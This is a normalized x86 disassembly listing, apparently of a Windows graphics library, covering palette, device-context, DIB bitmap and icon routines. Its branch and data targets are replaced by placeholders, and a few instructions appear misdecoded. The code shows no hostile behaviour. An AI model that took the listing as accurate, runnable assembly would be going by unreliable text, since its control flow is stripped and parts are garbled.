mov [ fs : eax ] edx
push sub_41dd47
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41dd54
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41dd8c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c40
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41de04
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41de5c
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41df59
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df60
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41df74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41dffa
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e00c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41de04
mov eax esp
call sub_41df74
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e0b0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41de04
mov [ esp ] eax
sub_41e104
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41daac
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41da8c
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e2b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d91c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e1d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41d92c
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1dd
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41d820
sub_41e1dd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41daac
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d91c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e290
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41d92c
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e297
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e2cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e35c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079c0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41e653
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41e445
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41d820
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e44c
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e44c
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e2c0
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_4079c0
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41e633
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e104
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4079c0
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41e610
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e617
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41d874
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e2c0
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e2cc
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41e664
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41d808
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c40
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41daac
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41e748
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41e664
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41e7b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41e664
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e851
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e858
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41e888
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c40
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41e87c
xor edx edx
push ebp
push sub_41ea76
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41e748
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41e748
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41ea4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_4079c0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_4079c0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_4079c0
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079c0
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41e7b4
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41e7b4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea56
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41ea56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea7d
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41ea84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41ead4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41eb2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41ead4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41eb75
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40316c
mov edi eax
mov eax esi
call sub_40316c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ecaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ec92
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407aec
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec99
mov al 0x1
sub_41ecc8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b44
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ed10
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed17
mov eax [ ebp - 0x4 ]
call sub_403224
retn
sub_41ed1c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
